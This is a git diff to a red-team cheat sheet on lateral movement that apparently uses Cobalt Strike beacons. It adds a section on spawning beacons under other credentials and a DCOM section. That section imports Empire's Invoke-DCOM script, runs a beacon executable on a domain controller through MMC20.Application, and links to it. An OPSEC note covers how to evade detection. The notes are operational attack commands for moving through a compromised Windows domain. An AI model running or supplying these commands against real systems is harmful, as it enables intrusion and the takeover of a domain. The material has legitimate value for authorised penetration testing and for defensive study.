@@ -1,6 +1,6 @@
 ---
 title: Lateral Movement
-category: Red Team
+category: 00 Red Team
 order: 7
 ---
 
@@ -75,6 +75,19 @@ baecon> execute-assembly /path/payload.exe -computername=dc01
 baecon> powershell Get-ChildItem -computername=dc01
 ```
 
+## Spawn
+
+
+Notice that due to problems of **CoInitializeSecurity** COM object, a different security context for example another user can not be used in the same beacon process.
+
+To that reason we need to spawn another beacon.
+
+`spawn` and `spawnas` starts a new session with the provided credentials. 
+
+```
+beacon> spawn
+```
+
 # PowerShell Remoting
 
 The `winrm` and `winrm64` methods can be used to use powershell remoting.
@@ -122,3 +135,21 @@ After executing the beacon we will neeed to connect to it.
 beacon> link dc01 \\dc01\pipe\[namepipe]
 ```
 
+# Distributed Component Object Model (DCOM)
+
+Beacon has no built-in capabilities to interact over DCOM, so we can use `Invoke-DCOM`.
+
+* [https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)
+
+
+```
+beacon> powershell-import .\Invoke-DCOM.ps1
+beacon> powershell Invoke-DCOM -ComputerName dc01 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
+beacon> link dc01
+```
+
+> **OPSEC Note**: `DCOM` is more complicated to detect, since each method works in a different way. If `MMC20.Application` method spawns a process, the spawned process will be a child of `mmc.exe`.
+>
+> `ProcessId: 952`
+> `Image: C:\Windows\beacon-smb.exe`
+> `ParentImage: C:\Windows\System32\mmc.exe`
